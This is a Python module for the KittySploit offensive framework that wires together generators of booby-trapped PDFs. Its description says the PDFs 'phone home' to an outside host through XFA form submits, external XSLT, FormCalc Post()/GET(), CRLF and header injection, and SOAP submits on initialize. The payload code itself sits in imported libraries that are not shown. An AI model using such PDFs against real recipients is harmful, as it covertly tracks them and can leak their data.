#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfPhonehomeMixin, format_test_ids
from lib.pdf.generators.xfa import write_xfa_submit, write_xfa_xslt_callback, write_xfa_formcalc_post, write_xfa_crlf_submit, write_formcalc_post_headers, write_xfa_soap_submit


class Module(Auxiliary, PdfPhonehomeMixin):
    __info__ = {
        "name": "PDF XFA Callback Generator",
        "description": (
            "Generate XFA-based PDFs with phone-home behavior: XDP form submit, "
            "external XSLT, FormCalc Post()/GET(), CRLF injection in submit headers, "
            "arbitrary HTTP header injection, and SOAP submit on initialize."
        ),
        "author": ["KittySploit Team"],
        "references": [
            "https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html",
        ],
        "tags": ["pdf", "xfa", "formcalc", "phone-home", "callback", "acrobat"],
    }

    PDF_GENERATORS = (
        write_xfa_submit,
        write_xfa_xslt_callback,
        write_xfa_formcalc_post,
        write_xfa_crlf_submit,
        write_formcalc_post_headers,
        write_xfa_soap_submit,
    )

    MODULE_TITLE = "PDF XFA callback generator"

    def run(self):
        print_info(f"    Test ids: {format_test_ids(self.PDF_GENERATORS)}")
        return self.run_pdf_phonehome()